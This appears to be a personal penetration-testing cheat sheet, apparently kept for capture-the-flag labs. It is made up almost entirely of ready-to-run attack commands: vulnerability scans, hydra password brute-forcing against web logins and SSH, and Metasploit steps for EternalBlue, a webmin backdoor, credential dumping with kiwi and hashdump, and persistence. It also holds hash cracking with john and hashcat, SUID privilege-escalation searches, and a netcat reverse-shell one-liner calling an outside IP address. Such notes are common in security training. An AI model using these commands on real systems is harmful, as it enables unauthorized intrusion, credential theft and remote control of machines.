
# scanning

https://github.com/RustScan/RustScan/releases

```
sudo dpkg -i rustscan_2.0.1_amd64.deb
```

```
sudo rustscan  --ulimit 5000 -a [ip] -- -A -sS --top-ports 1024 --script=vuln,vulners -oX attackerkb.xml --reason --stats-every 5s 
```


----------

# dirbuster

```
gobuster dir -e -u [ip] -w /usr/share/wordlists/dirb/common.txt
```

-w

```
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
```

to check which extension to upload

```
/usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt
```


# SMB

```
smbclient //<IP>/anonymous
```

```
smbget -R smb://MACHINE_IP/anonymous
```

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
```

# http
``sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

```
`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`
```


nfs

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
```


ssh

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt <IP> ssh
```

```
ssh -i id_rsa <user>@<IP>
```

----------

web

1. check source code
2. check robots.txt
3. check directories

linux commands pr

# msf


---------

run post/windows/gather/credentials/credential_collector


hashdump


sysinfo


load mimikatz


load kiwi
creds_all


Example 6-12. Migrating to the notepad.exe process 
meterpreter > run post/windows/manage/migrate


run persistence -A


exploit(windows/smb/ms08_067_netapi)


exploit suggester


use auxiliary/scanner/smb/smb_ms17_010


auxiliary(scanner/smb/smb_enumshares)


auxiliary(scanner/smb/smb_version)


auxiliary(auxiliary/scanner/portscan/tcp)



-------------------

```
https://gist.github.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2
```
---------

```
ms17-010
```

```
exploit/windows/smb/ms17_010_eternalblue
```

```
set payload windows/x64/shell/reverse_tcp
```

--------
```
exploit/linux/webmin_backdoor
```

post

```
post/multi/manage/shell_to_meterpreter
```

migrate

```
spoolsv.exe
```

```
migrate -N PROCESS_NAME
```


exfiltration

``` 
load kiwi
creds_all
```

```
hashdump
```

search

```
search -f *.jpg
```



-----------


shell stablize
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

ctrl z

```bash
stty raw -echo
```

```bash
fg
```

-------

```
su -
```

changes to root user without sudo

-----
crypto and steg

https://gchq.github.io/
https://www.dcode.fr/cipher-identifier

```bash
steghide extract -sf stegosteg.jpg
```

```bash
strings file
```

```bash
binwalk meme.jpg
binwalk -e meme.jpg
```



hashes

```bash
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py
john --format=[format] --wordlist=[path of wordlist] [path to file]
```

john the ripper

```bash
sudo gzip -d /usr/share/wordslists/rockyou.txt.tar.gz
```

```bash
tar -xvf /usr/share/wordlists/rockyou.txt.gz
```

```bash
/usr/share/john/ssh2john.py id_rsa crack
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt crack
```

zip
```bash
zip2john secure.zip > secure.txt
john secure.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

rar
```bash
rar2john secure.rar > secure2.txt
john secure2.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

spectorgram
https://academo.org/demos/spectrum-analyzer/

-------------

```bash
 hashcat --help | grep "MD5"
```

```bash
hashcat -m 1400 -a 0 -o sha_cracked.txt sha2–256.txt /usr/share/wordlists/rockyou.txt
```

- **hashcat**: This is the command used to run Hashcat, a popular password cracking tool.
    
- **-m 1400**: This option specifies the hash mode. In this case, '-m 1400' indicates that Hashcat should use mode 1400, which is designed for cracking SHA-256 hashes.
    
- **-a 0**: This option specifies the attack mode. '-a 0' represents a straight dictionary attack, where Hashcat will go through each word in the wordlist and hash it using SHA-256, then compare the result with the target hash.
    
- **-o sha_cracked.txt**: This option specifies the output file where Hashcat will store the cracked passwords. In this case, the cracked passwords will be saved to a file named 'sha_cracked.txt.'
    
- **sha2–256.txt**: This is the file that contains the target SHA-256 hashes you want to crack. You need to replace this with the actual file containing the hashes you're trying to crack.
    
- **/usr/share/wordlists/rockyou.txt**: This is the wordlist file that Hashcat will use for the dictionary attack. It's a common practice to use well-known wordlists like 'rockyou.txt' in password cracking attempts because they contain a large number of commonly used passwords.

------
reverse shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.169.233 1234 >/tmp/f
```



# privsc

linux priv sc

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```
find / -perm /4000 2>&1 | grep -v “Permission denied”
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
sudo su
```

# find
sudo find / -type f -name "flag.txt"

z4x\B*BJ:\(r?"6a~Adm]"?cQj^uUJ


